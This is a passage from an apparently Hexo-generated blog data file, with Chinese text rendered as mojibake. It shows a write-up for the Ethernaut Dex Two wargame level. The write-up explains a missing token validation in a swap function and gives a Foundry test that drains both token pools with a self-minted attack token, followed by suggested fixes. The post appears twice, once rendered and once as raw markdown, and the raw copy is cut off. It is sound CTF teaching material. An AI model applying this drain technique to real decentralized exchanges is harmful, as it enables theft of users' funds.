ä¸€ç§åŸºäºæ™ºèƒ½åˆçº¦çš„äº¤æ˜“æ‰€ï¼Œå…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰ä¸­å¿ƒåŒ–ä¸­ä»‹çš„æƒ…å†µä¸‹äº¤æ˜“åŠ å¯†èµ„äº§ã€‚</li>\n<li><strong>ä»·æ ¼é¢„è¨€æœº (Price Oracle)</strong>: ä¸ºæ™ºèƒ½åˆçº¦æä¾›é“¾ä¸‹æˆ–é“¾ä¸Šèµ„äº§ä»·æ ¼ä¿¡æ¯çš„æœåŠ¡ã€‚</li>\n<li><strong>æ•´æ•°é™¤æ³•</strong>: Solidityï¼ˆä»¥åŠè®¸å¤šå…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼‰ä¸­æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥çš„ç‰¹æ€§ï¼Œæ˜¯è®¸å¤šæ•°å­¦ç›¸å…³æ¼æ´çš„æ ¹æºã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åœ¨æ™ºèƒ½åˆçº¦ä¸­è¿›è¡Œé‡‘èè®¡ç®—æ—¶ï¼Œæ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ¼æ´ã€‚</li>\n<li>ç®€å•çš„ã€åŸºäºå³æ—¶æµåŠ¨æ€§çš„ä»·æ ¼å‘ç°æœºåˆ¶å¾ˆå®¹æ˜“è¢«æ“çºµã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„äº¤æ˜“ï¼Œåˆ©ç”¨å¹¶æ”¾å¤§æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ã€‚</li>\n<li>é€æ¸ç§¯ç´¯ä¼˜åŠ¿ï¼Œç›´åˆ°èƒ½å¤Ÿå®Œå…¨è€—å°½æµåŠ¨æ€§æ± ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä½¿ç”¨æ›´æˆç†Ÿå’ŒæŠ—æ“çºµçš„å®šä»·æ¨¡å‹ï¼ˆå¦‚æ’å®šä¹˜ç§¯æ¨¡å‹ï¼‰ã€‚</li>\n<li>åœ¨è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œå§‹ç»ˆæ³¨æ„è¿ç®—é¡ºåºå’Œç²¾åº¦æŸå¤±é—®é¢˜ã€‚</li>\n<li>å¯¹äºå…³é”®åº”ç”¨ï¼Œä¾èµ–äºå¥å£®çš„ä»·æ ¼é¢„è¨€æœºï¼Œè€Œä¸æ˜¯æ˜“å—æ”»å‡»çš„å³æ—¶ä»·æ ¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://uniswap.org/whitepaper.pdf\">Uniswap V2 Whitepaper</a></li>\n<li><a href=\"https://docs.chain.link/docs/get-the-latest-price/\">Chainlink Price Feeds</a></li>\n</ul>\n"},{"title":"Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ","date":"2025-01-25T09:00:00.000Z","updated":"2025-01-25T09:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨DEXåˆçº¦ä¸­ç¼ºå¤±çš„ä»£å¸ç™½åå•éªŒè¯ï¼Œé€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ã€ä»·å€¼æä½çš„ä»£å¸æ¥æ“çºµäº¤æ˜“å¯¹çš„ä»·æ ¼ã€‚å­¦ä¹ å¦‚ä½•ç”¨ä¸€ä¸ªæ¯«æ— ä»·å€¼çš„ä»£å¸æ¢å–æ± ä¸­æ‰€æœ‰æœ‰ä»·å€¼çš„ä»£å¸ï¼ŒæŒæ¡ Dex Two å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 23 - Dex Two](https://ethernaut.openzeppelin.com/level/23)  \n> **æ”»å‡»ç±»å‹**: ä»·æ ¼æ“çºµ / ç¼ºå°‘è¾“å…¥éªŒè¯  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä½ éœ€è¦ä¸ä¸€ä¸ª `Dex` åˆçº¦äº¤äº’ã€‚ä½†è¿™æ¬¡çš„ç›®æ ‡æ›´å…·æŒ‘æˆ˜æ€§ï¼šä½ éœ€è¦åŒæ—¶è€—å°½ `Dex` åˆçº¦ä¸­ `Token1` **å’Œ** `Token2` çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚\n\n-   **åˆå§‹çŠ¶æ€**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`DexTwo` åˆçº¦çš„ä»£ç ä¸ä¸Šä¸€å…³çš„ `Dex` å‡ ä¹å®Œå…¨ç›¸åŒï¼Œä½†æœ‰ä¸€ä¸ªå¾®å°å´è‡´å‘½çš„æ”¹åŠ¨ã€‚åœ¨ `swap` å‡½æ•°ä¸­ï¼Œä¸€è¡Œå…³é”®çš„éªŒè¯ä»£ç è¢«ç§»é™¤äº†ï¼š\n\n```solidity\n// This line was present in Dex, but is missing in DexTwo\n// require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n```\n\nè¿™è¡Œä»£ç åŸæœ¬ç”¨äºç¡®ä¿äº¤æ˜“åªåœ¨ `token1` å’Œ `token2` ä¹‹é—´è¿›è¡Œã€‚ç”±äºå®ƒè¢«ç§»é™¤äº†ï¼Œ`DexTwo` çš„ `swap` å‡½æ•°ç°åœ¨å¯ä»¥æ¥å—**ä»»ä½•**ç¬¦åˆERC20æ ‡å‡†çš„ä»£å¸ä½œä¸ºäº¤æ˜“å¯¹çš„ä¸€æ–¹ã€‚\n\nè¿™å°±ä¸ºæˆ‘ä»¬æ‰“å¼€äº†æ”»å‡»çš„å¤§é—¨ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ã€æ¯«æ— ä»·å€¼çš„â€œæ”»å‡»ä»£å¸â€ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º `Token3`ï¼‰ï¼Œå¹¶ç”¨å®ƒæ¥æ“çºµä¸ `Token1` å’Œ `Token2` çš„äº¤æ˜“ä»·æ ¼ã€‚\n\n### æ”»å‡»æµç¨‹\n\næˆ‘ä»¬çš„ç­–ç•¥æ˜¯åˆ©ç”¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ `Token3` ä½œä¸ºåª’ä»‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å– `Dex` æ± ä¸­æ‰€æœ‰çš„ `Token1` å’Œ `Token2`ã€‚\n\n1.  **åˆ›å»ºå¹¶åˆ†å‘æ”»å‡»ä»£å¸**: æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ERC20ä»£å¸ `Token3`ï¼Œå¹¶ç»™è‡ªå·±é“¸é€ å¤§é‡çš„ `Token3`ã€‚\n\n2.  **ä¸º `Token3` æä¾›â€œæµåŠ¨æ€§â€**: æˆ‘ä»¬å‘ `DexTwo` åˆçº¦å‘é€æå°‘é‡çš„ `Token3`ï¼ˆä¾‹å¦‚ï¼Œ1ä¸ªï¼‰ã€‚ç°åœ¨ `DexTwo` åˆçº¦ä¸­ `Token3` çš„ä½™é¢ä¸º1ã€‚\n\n3.  **ç¬¬ä¸€æ¬¡äº¤æ¢ (Token3 -> Token1)**:\n    *   æˆ‘ä»¬ç°åœ¨ç”¨ `Token3` äº¤æ¢ `Token1`ã€‚æ± ä¸­ `Token1` çš„ä½™é¢æ˜¯100ï¼Œ`Token3` çš„ä½™é¢æ˜¯1ã€‚ä»·æ ¼æ¯”ä¸º 100:1ã€‚\n    *   æˆ‘ä»¬åªéœ€è¦å‘é€1ä¸ª `Token3`ï¼Œå°±å¯ä»¥æ ¹æ®ä»·æ ¼å…¬å¼æ¢å– `(1 * 100) / 1 = 100` ä¸ª `Token1`ã€‚\n    *   äº¤æ¢åï¼Œ`Dex` æ± ä¸­çš„ `Token1` è¢«å…¨éƒ¨æ¢èµ°ã€‚\n\n4.  **ç¬¬äºŒæ¬¡äº¤æ¢ (Token3 -> Token2)**:\n    *   ç°åœ¨æ± ä¸­ `Token2` çš„ä½™é¢æ˜¯100ï¼Œ`Token3` çš„ä½™é¢æ˜¯2ï¼ˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡äº¤æ¢æ—¶è½¬å…¥äº†1ä¸ªï¼Œç°åœ¨åˆè½¬å…¥äº†1ä¸ªï¼‰ã€‚ä»·æ ¼æ¯”ä¸º 100:2ï¼Œå³ 50:1ã€‚\n    *   æˆ‘ä»¬å‘é€2ä¸ª `Token3`ï¼Œå°±å¯ä»¥æ¢å– `(2 * 100) / 2 = 100` ä¸ª `Token2`ã€‚\n    *   äº¤æ¢åï¼Œ`Dex` æ± ä¸­çš„ `Token2` ä¹Ÿè¢«å…¨éƒ¨æ¢èµ°ã€‚\n\né€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬å®Œå…¨æ§åˆ¶çš„ç¬¬ä¸‰æ–¹ä»£å¸ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ“çºµäº†ä»·æ ¼ï¼Œå¹¶ç”¨æå°çš„ä»£ä»·ï¼ˆæ€»å…±3ä¸ªæˆ‘ä»¬è‡ªå·±éšæ„é“¸é€ çš„ `Token3`ï¼‰æ¸…ç©ºäº†æ•´ä¸ª `Dex` æ± ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„æ”»å‡»æµç¨‹ï¼šåˆ›å»ºæ–°ä»£å¸ï¼Œå¹¶ç”¨å®ƒæ¥è€—å°½ `DexTwo` çš„æµåŠ¨æ€§ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/23_DexTwo.sol\";\n\ncontract DexTwoTest is Test {\n    DexTwo instance;\n    address player;\n    SwappableTokenTwo token1;\n    SwappableTokenTwo token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new DexTwo();\n\n        // éƒ¨ç½²å¹¶è®¾ç½®åˆå§‹ä»£å¸\n        token1 = new SwappableTokenTwo(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableTokenTwo(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // æ·»åŠ æµåŠ¨æ€§å¹¶å‘é€åˆå§‹ä»£å¸ç»™ player\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.add_liquidity(address(token1), 100);\n        instance.add_liquidity(address(token2), 100);\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexTwoAttack() public {\n        vm.startPrank(player);\n\n        // 1. éƒ¨ç½²æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ä»£å¸\n        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), \"Attack Token\", \"ATK\", 400);\n        attackToken.approve(address(instance), type(uint256).max);\n\n        // 2. å‘ Dex æä¾›æå°‘é‡çš„æ¶æ„ä»£å¸æµåŠ¨æ€§\n        attackToken.transfer(address(instance), 1);\n\n        // 3. ç”¨1ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token1\n        uint256 dexT1Balance = token1.balanceOf(address(instance));\n        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);\n        assertEq(swapAmount1, dexT1Balance, \"Price should allow draining Token1\");\n        instance.swap(address(attackToken), address(token1), 1);\n\n        // 4. ç”¨2ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token2\n        uint256 dexT2Balance = token2.balanceOf(address(instance));\n        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);\n        assertEq(swapAmount2, dexT2Balance, \"Price should allow draining Token2\");\n        instance.swap(address(attackToken), address(token2), 2);\n\n        // 5. éªŒè¯ Dex çš„ä¸¤ç§ä»£å¸éƒ½å·²è¢«è€—å°½\n        bool drained = token1.balanceOf(address(instance)) == 0 && token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of both tokens\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è¯†åˆ«æ¼æ´**: å‘ç° `swap` å‡½æ•°ç¼ºå°‘å¯¹äº¤æ˜“ä»£å¸çš„ç™½åå•éªŒè¯ã€‚\n2.  **åˆ›å»ºæ”»å‡»ä»£å¸**: éƒ¨ç½²ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ERC20ä»£å¸ã€‚\n3.  **æ³¨å…¥è™šå‡æµåŠ¨æ€§**: å‘ `DexTwo` åˆçº¦å‘é€æå°‘é‡çš„æ”»å‡»ä»£å¸ï¼Œä»¥å»ºç«‹ä¸€ä¸ªæä¸å¹³è¡¡çš„äº¤æ˜“å¯¹ã€‚\n4.  **è€—å°½Token1**: ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ `DexTwo` ä¸­æ‰€æœ‰çš„ `Token1`ã€‚\n5.  **è€—å°½Token2**: å†æ¬¡ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ `DexTwo` ä¸­æ‰€æœ‰çš„ `Token2`ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä¸¥æ ¼çš„è¾“å…¥éªŒè¯**: è¿™æ˜¯æœ€å…³é”®çš„é˜²å¾¡æªæ–½ã€‚åˆçº¦å¿…é¡»ä¸¥æ ¼éªŒè¯æ‰€æœ‰å¤–éƒ¨è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å†³å®šæ ¸å¿ƒé€»è¾‘çš„å‚æ•°ï¼Œå¦‚æœ¬ä¾‹ä¸­çš„ä»£å¸åœ°å€ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®ï¼šåŠ å›è¢«ç§»é™¤çš„éªŒè¯\n    function swap(address from, address to, uint amount) public {\n        require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n        // ... a reste of the swap logic\n    }\n    ```\n\n2.  **ä½¿ç”¨ç™½åå•**: å¯¹äºå…è®¸å“ªäº›ä»£å¸å‚ä¸äº¤äº’çš„ç³»ç»Ÿï¼Œåº”ç»´æŠ¤ä¸€ä¸ªå¯ä¿¡ä»£å¸çš„ç™½åå•ï¼Œå¹¶å¯¹æ‰€æœ‰ä¼ å…¥çš„ä»£å¸åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **è¾“å…¥éªŒè¯**: æ™ºèƒ½åˆçº¦å®‰å…¨ä¸­æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦çš„åŸåˆ™ä¹‹ä¸€ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªå¤–éƒ¨çš„è¾“å…¥ã€‚\n-   **ä»£å¸ç™½åå•**: ä¸€ç§å¸¸è§çš„å®‰å…¨æ¨¡å¼ï¼Œç”¨äºé™åˆ¶ç³»ç»Ÿåªä¸é¢„å…ˆæ‰¹å‡†çš„ã€å—ä¿¡ä»»çš„ä»£å¸åˆçº¦è¿›è¡Œäº¤äº’ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   ç¼ºå°‘å¯¹è¾“å…¥å‚æ•°ï¼ˆå¦‚ä»£å¸åœ°å€ï¼‰çš„éªŒè¯æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚\n-   åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ä¸­ï¼Œå¦‚æœå…è®¸ä»»æ„ä»£å¸å‚ä¸äº¤æ˜“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¼•å…¥è‡ªå·±æ§åˆ¶çš„ä»£å¸æ¥è½»æ˜“åœ°æ“çºµä»·æ ¼ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ›å»ºä¸€ä¸ªæ–°çš„ã€ç”±æ”»å‡»è€…å®Œå…¨æ§åˆ¶çš„ERC20ä»£å¸ã€‚\n-   å°†è¿™ä¸ªæ–°ä»£å¸ä¸ç›®æ ‡ä»£å¸åœ¨ä¸€ä¸ªç¼ºä¹éªŒè¯çš„DEXä¸­å½¢æˆäº¤æ˜“å¯¹ã€‚\n-   åˆ©ç”¨æä¸å¹³è¡¡çš„æµåŠ¨æ€§æ¯”ä¾‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å–æ‰€æœ‰ç›®æ ‡ä»£å¹£ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å¯¹æ‰€æœ‰å‡½æ•°çš„è¾“å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼çš„ç™½åå•æˆ–æœ‰æ•ˆæ€§æ£€æŸ¥ã€‚\n-   ç¡®ä¿æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚äº¤æ˜“ï¼‰åªèƒ½åœ¨é¢„æœŸçš„ã€å—ä¿¡ä»»çš„èµ„äº§ä¹‹é—´è¿›è¡Œã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [SWC-107: Unchecked External Call](https://swcregistry.io/docs/SWC-107) (è™½ç„¶æœ¬ä¾‹æ˜¯ç¼ºå°‘éªŒè¯ï¼Œä½†æ ¹æºéƒ½æ˜¯å¯¹å¤–éƒ¨è¾“å…¥/åˆçº¦çš„ä¸ä¿¡ä»»)\n-   [Secureum: Input Validation](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)","source":"_posts/ethernaut-level-23-dex-two.md","raw":"---\ntitle: 'Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ'\ndate: 2025-01-25 17:00:00\nupdated: 2025-01-25 17:00:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - é«˜çº§æ”»å‡»ç¯‡ (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - DEX\n  - Price Manipulation\n  - Token Validation\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨DEXåˆçº¦ä¸­ç¼ºå¤±çš„ä»£å¸ç™½åå•éªŒè¯ï¼Œé€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ã€ä»·å€¼æä½çš„ä»£å¸æ¥æ“çºµäº¤æ˜“å¯¹çš„ä»·æ ¼ã€‚å­¦ä¹ å¦‚ä½•ç”¨ä¸€ä¸ªæ¯«æ— ä»·å€¼çš„ä»£å¸æ¢å–æ± ä¸­æ‰€æœ‰æœ‰ä»·å€¼çš„ä»£å¸ï¼ŒæŒæ¡ Dex Two å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 23 - Dex Two](https://ethernaut.openzeppelin.com/level/23)  \n> **æ”»å‡»ç±»å‹**: ä»·æ ¼æ“çºµ / ç¼ºå°‘è¾“å…¥éªŒè¯  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä½ éœ€è¦ä¸ä¸€ä¸ª `Dex` åˆçº¦äº¤äº’ã€‚ä½†è¿™æ¬¡çš„ç›®æ ‡æ›´å…·æŒ‘æˆ˜æ€§ï¼šä½ éœ€è¦åŒæ—¶è€—å°½ `Dex` åˆçº¦ä¸­ `Token1` **å’Œ** `Token2` çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚\n\n-   **åˆå§‹çŠ¶æ€**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`DexTwo` åˆçº¦çš„ä»£ç ä¸ä¸Šä¸€å…³çš„ `Dex` å‡ ä¹å®Œå…¨ç›¸åŒï¼Œä½†æœ‰ä¸€ä¸ªå¾®å°å´è‡´å‘½çš„æ”¹åŠ¨ã€‚åœ¨ `swap` å‡½æ•°ä¸­ï¼Œä¸€è¡Œå…³é”®çš„éªŒè¯ä»£ç è¢«ç§»é™¤äº†ï¼š\n\n```solidity\n// This line was present in Dex, but is missing in DexTwo\n// require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n```\n\nè¿™è¡Œä»£ç åŸæœ¬ç”¨äºç¡®ä¿äº¤æ˜“åªåœ¨ `token1` å’Œ `token2` ä¹‹é—´è¿›è¡Œã€‚ç”±äºå®ƒè¢«ç§»é™¤äº†ï¼Œ`DexTwo` çš„ `swap` å‡½æ•°ç°åœ¨å¯ä»¥æ¥å—**ä»»ä½•**ç¬¦åˆERC20æ ‡å‡†çš„ä»£å¸ä½œä¸ºäº¤æ˜“å¯¹çš„ä¸€æ–¹ã€‚\n\nè¿™å°±ä¸ºæˆ‘ä»¬æ‰“å¼€äº†æ”»å‡»çš„å¤§é—¨ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ã€æ¯«æ— ä»·å€¼çš„â€œæ”»å‡»ä»£å¸â€ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º `Token3`ï¼‰ï¼Œå¹¶ç”¨å®ƒæ¥æ“çºµä¸ `Token1` å’Œ `Token2` çš„äº¤æ˜“ä»·æ ¼ã€‚\n\n### æ”»å‡»æµç¨‹\n\næˆ‘ä»¬çš„ç­–ç•¥æ˜¯åˆ©ç”¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ `Token3` ä½œä¸ºåª’ä»‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å– `Dex` æ± ä¸­æ‰€æœ‰çš„ `Token1` å’Œ `Token2`ã€‚\n\n1.  **åˆ›å»ºå¹¶åˆ†å‘æ”»å‡»ä»£å¸**: æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ERC20ä»£å¸ `Token3`ï¼Œå¹¶ç»™è‡ªå·±é“¸é€ å¤§é‡çš„ `Token3`ã€‚\n\n2.  **ä¸º `Token3` æä¾›â€œæµåŠ¨æ€§â€**: æˆ‘ä»¬å‘ `DexTwo` åˆçº¦å‘é€æå°‘é‡çš„ `Token3`ï¼ˆä¾‹å¦‚ï¼Œ1ä¸ªï¼‰ã€‚ç°åœ¨ `DexTwo` åˆçº¦ä¸­ `Token3` çš„ä½™é¢ä¸º1ã€‚\n\n3.  **ç¬¬ä¸€æ¬¡äº¤æ¢ (Token3 -> Token1)**:\n    *   æˆ‘ä»¬ç°åœ¨ç”¨ `Token3` äº¤æ¢ `Token1`ã€‚æ± ä¸­ `Token1` çš„ä½™é¢æ˜¯100ï¼Œ`Token3` çš„ä½™é¢æ˜¯1ã€‚ä»·æ ¼æ¯”ä¸º 100:1ã€‚\n    *   æˆ‘ä»¬åªéœ€è¦å‘é€1ä¸ª `Token3`ï¼Œå°±å¯ä»¥æ ¹æ®ä»·æ ¼å…¬å¼æ¢å– `(1 * 100) / 1 = 100` ä¸ª `Token1`ã€‚\n    *   äº¤æ¢åï¼Œ`Dex` æ± ä¸­çš„ `Token1` è¢«å…¨éƒ¨æ¢èµ°ã€‚\n\n4.  **ç¬¬äºŒæ¬¡äº¤æ¢ (Token3 -> Token2)**:\n    *   ç°åœ¨æ± ä¸­ `Token2` çš„ä½™é¢æ˜¯100ï¼Œ`Token3` çš„ä½™é¢æ˜¯2ï¼ˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡äº¤æ¢æ—¶è½¬å…¥äº†1ä¸ªï¼Œç°åœ¨åˆè½¬å…¥äº†1ä¸ªï¼‰ã€‚ä»·æ ¼æ¯”ä¸º 100:2ï¼Œå³ 50:1ã€‚\n    *   æˆ‘ä»¬å‘é€2ä¸ª `Token3`ï¼Œå°±å¯ä»¥æ¢å– `(2 * 100) / 2 = 100` ä¸ª `Token2`ã€‚\n    *   äº¤æ¢åï¼Œ`Dex` æ± ä¸­çš„ `Token2` ä¹Ÿè¢«å…¨éƒ¨æ¢èµ°ã€‚\n\né€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬å®Œå…¨æ§åˆ¶çš„ç¬¬ä¸‰æ–¹ä»£å¸ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ“çºµäº†ä»·æ ¼ï¼Œå¹¶ç”¨æå°çš„ä»£ä»·ï¼ˆæ€»å…±3ä¸ªæˆ‘ä»¬è‡ªå·±éšæ„é“¸é€ çš„ `Token3`ï¼‰æ¸…ç©ºäº†æ•´ä¸ª `Dex` æ± ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„æ”»å‡»æµç¨‹ï¼šåˆ›å»ºæ–°ä»£å¸ï¼Œå¹¶ç”¨å®ƒæ¥è€—å°½ `DexTwo` çš„æµåŠ¨æ€§ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/23_DexTwo.sol\";\n\ncontract DexTwoTest is Test {\n    DexTwo instance;\n    address player;\n    SwappableTokenTwo token1;\n    SwappableTokenTwo token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new DexTwo();\n\n        // éƒ¨ç½²å¹¶è®¾ç½®åˆå§‹ä»£å¸\n        token1 = new SwappableTokenTwo(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableTokenTwo(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // æ·»åŠ æµåŠ¨æ€§å¹¶å‘é€åˆå§‹ä»£å¸ç»™ player\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.add_liquidity(address(token1), 100);\n        instance.add_liquidity(address(token2), 100);\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexTwoAttack() public {\n        vm.startPrank(player);\n\n        // 1. éƒ¨ç½²æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ä»£å¸\n        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), \"Attack Token\", \"ATK\", 400);\n        attackToken.approve(address(instance), type(uint256).max);\n\n        // 2. å‘ Dex æä¾›æå°‘é‡çš„æ¶æ„ä»£å¸æµåŠ¨æ€§\n        attackToken.transfer(address(instance), 1);\n\n        // 3. ç”¨1ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token1\n        uint256 dexT1Balance = token1.balanceOf(address(instance));\n        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);\n        assertEq(swapAmount1, dexT1Balance, \"Price should allow draining Token1\");\n        instance.swap(address(attackToken), address(token1), 1);\n\n        // 4. ç”¨2ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token2\n        uint256 dexT2Balance = token2.balanceOf(address(instance));\n        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);\n        assertEq(swapAmount2, dexT2Balance, \"Price should allow draining Token2\");\n        instance.swap(address(attackToken), address(token2), 2);\n\n        // 5. éªŒè¯ Dex çš„ä¸¤ç§ä»£å¸éƒ½å·²è¢«è€—å°½\n        bool drained = token1.balanceOf(address(instance)) == 0 && token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of both tokens\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è¯†åˆ«æ¼æ´**: å‘ç° `swap` å‡½æ•°ç¼ºå°‘å¯¹äº¤æ˜“ä»£å¸çš„ç™½åå•éªŒè¯ã€‚\n2.  